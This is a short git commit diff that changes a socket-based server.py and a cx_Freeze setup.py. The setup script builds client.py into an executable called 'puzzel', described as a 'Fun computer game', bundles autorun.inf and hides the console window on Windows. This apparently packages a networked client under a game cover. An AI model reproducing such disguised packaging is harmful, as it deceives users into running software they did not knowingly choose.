058efa1a52151133a0783aa3dfc34c345cad28cd
yurchik <15_yurchik@ukr.net>
2016-12-01 09:28:12 +0200

    Add creating of executable file for all the system type

--- server.py
+++ server.py
@@ -1,6 +1,5 @@
 import socket
 import threading
-import sys
 import time
 from queue import Queue
 
--- setup.py
+++ setup.py
@@ -1,15 +1,14 @@
 import sys
-from cx_Freeze import setup, executable
-
+from cx_Freeze import setup, Executable
 
 include_files = ['autorun.inf']
 base = None
 
 if sys.platform == "win32":
-	base = "Win32GUI"
+    base = "Win32GUI"
 
 setup(name="puzzel",
-	  version="0.1",
-	  description="Fun computer game",
-	  options={'buil_exe': {'include_files': include_files}},
-	  executables=[Executable("client.by", base=base)])
+      version="0.1",
+      description="Fun computer game",
+      options={'buil_exe': {'include_files': include_files}},
+      executables=[Executable("client.py", base=base)])
